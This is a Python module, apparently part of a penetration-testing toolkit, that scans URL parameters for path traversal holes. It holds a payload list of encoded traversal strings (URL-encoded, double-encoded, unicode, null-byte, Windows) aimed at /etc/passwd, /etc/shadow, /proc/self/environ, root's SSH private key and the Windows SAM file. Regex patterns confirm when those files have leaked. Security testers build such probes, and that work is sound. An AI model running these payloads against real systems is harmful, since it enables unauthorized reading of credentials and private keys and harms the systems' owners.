"""
Path traversal bypass module.

Tests basic path traversal sequences against URL parameters.
This is a lightweight probe — for full LFI (PHP wrappers, proc, log
poisoning) use the dedicated /lfi harness.

Techniques:
  - Classic: ../../../etc/passwd
  - URL-encoded: ..%2f..%2f..%2fetc%2fpasswd
  - Double-encoded: ..%252f..%252f..%252fetc%252fpasswd
  - Unicode: %c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
  - Null byte + extension: ../../../etc/passwd%00.jpg
  - Overlong: ....//....//....//etc/passwd
  - Windows paths: ..\\..\\windows\\system32\\config\\sam
"""

import asyncio
import re
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

from . import BypassResult

try:
    from scope_validator import ScopeValidator
except ImportError:
    ScopeValidator = None
try:
    from rate_limiter import RateLimiter
except ImportError:
    RateLimiter = None

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

# (category, payload)
_PAYLOADS: list[tuple[str, str]] = [
    # Classic
    ("classic",         "../../../etc/passwd"),
    ("classic",         "../../../../etc/passwd"),
    ("classic",         "../../../../../etc/passwd"),
    ("classic",         "../../../../../../etc/passwd"),
    # URL-encoded single
    ("url_encoded",     "..%2f..%2f..%2fetc%2fpasswd"),
    ("url_encoded",     "..%2F..%2F..%2Fetc%2Fpasswd"),
    # Double-encoded
    ("double_encoded",  "..%252f..%252f..%252fetc%252fpasswd"),
    ("double_encoded",  "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
    # URL-encoded mixed
    ("encoded_mixed",   "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("encoded_mixed",   "%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
    # Unicode
    ("unicode",         "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"),
    ("unicode",         "%ef%bc%8e%ef%bc%8e%2f%ef%bc%8e%ef%bc%8e%2fetc/passwd"),
    # Null byte
    ("null_byte",       "../../../etc/passwd%00"),
    ("null_byte",       "../../../etc/passwd%00.jpg"),
    ("null_byte",       "../../../etc/passwd%2500"),
    # Overlong / dotdotslash
    ("overlong",        "....//....//....//etc/passwd"),
    ("overlong",        "..//////etc/passwd"),
    # Path segment bypass
    ("segment_bypass",  "..;/..;/..;/etc/passwd"),
    ("segment_bypass",  "..%00/..%00/..%00/etc/passwd"),
    # Windows
    ("windows",         "..\\..\\..\\windows\\system32\\config\\sam"),
    ("windows",         "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"),
    # Interesting targets beyond passwd
    ("classic",         "../../../etc/shadow"),
    ("classic",         "../../../etc/hosts"),
    ("classic",         "../../../proc/self/environ"),
    ("classic",         "../../../root/.ssh/id_rsa"),
]

_CONFIRM_PATTERNS: list[tuple[str, str]] = [
    (r"root:x:0:0",             "Linux /etc/passwd"),
    (r"root:!:0:0",             "Linux /etc/shadow"),
    (r"nobody:x:",              "/etc/passwd entry"),
    (r"127\.0\.0\.1\s+localhost", "/etc/hosts"),
    (r"HTTP_",                  "/proc/self/environ"),
    (r"SERVER_SOFTWARE",        "/proc/self/environ"),
    (r"-----BEGIN.*PRIVATE KEY", "SSH private key"),
    (r"\[boot loader\]",        "Windows boot.ini"),
    (r"\[HKEY_LOCAL_MACHINE\]", "Windows registry"),
]

# ---------------------------------------------------------------------------
# TraversalBypass
# ---------------------------------------------------------------------------

class TraversalBypass:
    name = "Path Traversal"
    description = "Basic path traversal file read (non-LFI)"
    requires_param = True   # needs a parameter to inject into

    async def detect(
        self,
        target: str,
        client: httpx.AsyncClient,
        limiter,
    ) -> bool:
        """Return True if target has a query parameter that looks like a file path."""
        parsed = urlparse(target)
        qs = parse_qs(parsed.query)
        file_keywords = ("file", "path", "page", "doc", "template", "include",
                         "module", "dir", "folder", "load", "read", "f", "fn")
        return any(k.lower() in file_keywords for k in qs)

    async def scan(
        self,
        target: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
        param: Optional[str] = None,
    ) -> list[BypassResult]:
        if not param:
            param = _guess_file_param(target)
        if not param:
            return [BypassResult(
                success=False, vuln_type="traversal", technique="no_param",
                category="setup", payload="", url=target,
                status_code=0, evidence="",
                note="No file-like parameter found. Use --param to specify.",
            )]

        coros = [
            self._probe(target, param, category, payload, client, sem, limiter)
            for category, payload in _PAYLOADS
        ]
        raw = await asyncio.gather(*coros, return_exceptions=True)

        results: list[BypassResult] = []
        for (category, payload), result in zip(_PAYLOADS, raw):
            if isinstance(result, Exception):
                results.append(BypassResult(
                    success=False, vuln_type="traversal", technique="param_injection",
                    category=category, payload=payload, url=target,
                    status_code=0, evidence="", note=f"error: {result}",
                ))
            else:
                results.append(result)
        return results

    async def _probe(
        self,
        target: str,
        param: str,
        category: str,
        payload: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
    ) -> BypassResult:
        sep = "&" if "?" in target else "?"
        url = f"{target}{sep}{param}={payload}"

        async with sem:
            try:
                async with limiter.http():
                    resp = await client.get(url)
                    limiter.adapt_to_response(resp)
            except httpx.RequestError as e:
                return BypassResult(
                    success=False, vuln_type="traversal", technique="param_injection",
                    category=category, payload=payload, url=url,
                    status_code=0, evidence="", note=f"request_error: {e}",
                )

        matched = next(
            (desc for pattern, desc in _CONFIRM_PATTERNS
             if re.search(pattern, resp.text, re.IGNORECASE)),
            None,
        )
        return BypassResult(
            success=matched is not None,
            vuln_type="traversal",
            technique="param_injection",
            category=category,
            payload=payload,
            url=url,
            status_code=resp.status_code,
            evidence=resp.text[:300],
            note=f"matched: {matched}" if matched else "",
        )


def _guess_file_param(url: str) -> Optional[str]:
    """Pick the most likely file-path param from the URL query string."""
    qs = parse_qs(urlparse(url).query)
    file_keywords = ("file", "path", "page", "doc", "template", "include",
                     "module", "dir", "folder", "load", "read", "f", "fn")
    for kw in file_keywords:
        for k in qs:
            if kw in k.lower():
                return k
    return next(iter(qs), None)
